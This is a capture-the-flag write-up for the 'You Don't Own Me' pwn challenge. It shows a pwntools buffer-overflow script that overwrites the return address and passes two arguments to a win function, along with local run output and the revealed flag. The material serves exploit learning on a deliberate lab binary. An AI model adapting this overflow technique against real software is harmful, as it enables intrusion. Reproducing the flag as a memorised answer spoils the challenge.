# You Don't Own Me

## Pwn

### You don't own me!  Don't try to change me in any way!


Straight up buffer overflow with the twist of needing two parameters passed into the function.

This is my script to execute the buffer overflow:

```python
# Pass in pattern_size, get back EIP/RIP offset
offset = 44

# Start program
io = start()

# Build the payload
payload = flat(
    offset * b"A",
    p32(0x080491b6),
    p32(0x080492e0),
    p32(0xdeadbeef),
    p32(0xc0defeed)
)

write('payload', payload)

# Send the payload

io.sendafter(b'name:', payload)
# Got Shell?
io.interactive()
```

Running it locally (NOTE: I needed to hit return after it went interactive):

```sh
$ python3 solver.py
[+] Starting local process './youdontownme': pid 4177748
[*] Switching to interactive mode
 $ 

I don't know you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08\xe0\x92\x04\x08ﾭ\xde\xed\xfe\xde\xc0. Goodbye!
Wow! You do own me!  Have a Flag
teractf{ju5t_L3t_m3_b3_my531f}

[*] Got EOF while reading in interactive
$ 
[*] Process './youdontownme' stopped with exit code -11 (SIGSEGV) (pid 4177748)
[*] Got EOF while sending in interactive
```


**teractf{ju5t_L3t_m3_b3_my531f}**


